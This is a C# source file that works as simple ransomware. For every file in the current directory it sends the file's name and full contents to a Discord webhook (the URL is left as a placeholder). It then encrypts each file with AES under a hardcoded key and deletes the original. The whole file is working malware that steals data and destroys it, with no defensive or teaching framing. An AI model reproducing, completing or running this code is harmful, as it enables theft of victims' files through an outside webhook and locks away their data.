using System;
using System.Text;
using Discord.Webhooks;
using SharpAESCrypt;
using System.Threading;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Net.NetworkInformation;
using System.Reflection.Metadata;
using System.Diagnostics;

namespace encrypt
{
    class Program
    {
       
        static void Main(string[] args)
        {
            /*  IF statement for null args    */
            if (args is null)
            {
                throw new ArgumentNullException(nameof(args));
            }
            
            /*  Variable holding the value of the files current directory    */
            string directory =  Directory.GetCurrentDirectory();
            
            /* Encrypting the key into base64 format */
            var bytes = Encoding.UTF8.GetBytes("dfjakjfklajldlkakfkldjafj");
            var key = Convert.ToBase64String(bytes, Base64FormattingOptions.InsertLineBreaks);
            
            /*  Variable to hold webhook link    */
            string webhook_link = "YOUR WEBHOOK";

            /*  Iterating over each file in "directory */
            foreach (string file in Directory.GetFiles(directory))
            {
                /*  Variable "content" holding the value of the content in the current file  */
                string content = File.ReadAllText(file);

                /*  Creating discord webhook */
                var webhook = new Webhook()
                {
                    /*  Message to send webhook holding "content"    */
                    Message = $"**File Name: **{file}   **Content: **```{content}```",
                    Username = "waves0101",
                    WebhookUrl = $"{webhook_link}"
                };
                Thread.Sleep(250);
                webhook.SendInstance();

               
            }
            
            /*  Iterate over file in directory   */
            foreach (string file in Directory.GetFiles(directory))
            {
                /*  Encrypting the content within each file for every iteration and deleting the file    */
                string encrypted = directory + "encrypted.txt";
                SharpAESCrypt.SharpAESCrypt.Encrypt(key, file, encrypted);
                File.Delete(file);
                File.Move(encrypted, file);

            }


        }
    }
}
